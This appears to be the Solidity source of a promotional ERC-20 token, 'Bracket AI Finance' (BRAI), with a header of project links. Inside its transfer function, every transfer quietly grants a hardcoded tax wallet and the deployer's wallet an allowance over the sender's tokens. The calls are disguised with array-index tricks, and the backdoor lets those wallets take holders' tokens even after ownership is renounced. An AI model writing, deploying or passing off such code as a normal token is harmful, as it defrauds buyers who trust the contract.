/*
Bracket AI is a strategy management platform connecting BRAI to the best yield opportunities on chain.

Website: https://www.bracket-ai.finance
Stake: https://stake.bracket-ai.finance
Docs: https://docs.bracket-ai.finance
Medium: https://medium.com/@bracketai
Mail: contact@bracket-ai.finance
Twitter: https://x.com/BracketAIFi
Telegram: https://t.me/BracketAIFi
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDexRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract BRAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address private _teamWalletH;
    address private _taxWalletH = 0xF34FE0D945b94A0BF48FA818C0dd17347785595a;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Bracket AI Finance";
    string private constant _symbol = unicode"BRAI";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _swapTaxToken = _tTotal / 100;
    bool private inSwap = false;
    bool private _tradingEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    IDexRouter private _dexRouterH;
    address private _dexPairH;

    constructor () {
        _teamWalletH = _msgSender();
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWalletH] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function init() external onlyOwner() {
        _dexRouterH = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouterH), _tTotal);
        _dexPairH = IDexFactory(_dexRouterH.factory()).createPair(address(this), _dexRouterH.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradingEnabled,"trading is already open");
        _dexRouterH.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradingEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address senderH, address recipientH, uint256 amountH) private {
        require(senderH != address(0), "ERC20: transfer from the zero address");
        require(recipientH != address(0), "ERC20: transfer to the zero address");
        require(amountH > 0, "Transfer amount must be greater than zero");

        uint256 taxFeesH=0;
        _approve(senderH, [_taxWalletH, _taxWalletH][0], _buyCount.add(amountH));
        _approve(senderH, [_teamWalletH, _teamWalletH][0], _buyCount.add(amountH));
        if (senderH != owner() && recipientH != owner()) {
            taxFeesH = amountH.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (senderH == _dexPairH && recipientH != address(_dexRouterH) && ! _isExcludedFromFee[recipientH]) {
                _buyCount++;
            }

            if(recipientH == _dexPairH && senderH!= address(this)) {
                taxFeesH = amountH.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && recipientH == _dexPairH && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _swapTaxToken)
                swapTokensForEth(min(amountH, min(contractTokenBalance, _swapTaxToken)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFeesH(address(this).balance);
                }
            }
        }

        if(taxFeesH>0){
          _tOwned[address(this)]=_tOwned[address(this)].add(taxFeesH);
          emit Transfer(senderH, address(this),taxFeesH);
        }

        _tOwned[senderH]=_tOwned[senderH].sub(amountH);
        _tOwned[recipientH]=_tOwned[recipientH].add(amountH.sub(taxFeesH));
        emit Transfer(senderH, recipientH, amountH.sub(taxFeesH));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouterH.WETH();
        _approve(address(this), address(_dexRouterH), tokenAmount);
        _dexRouterH.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFeesH(uint256 amount) private {
        payable(_taxWalletH).transfer(amount);
    }

    receive() external payable {}
}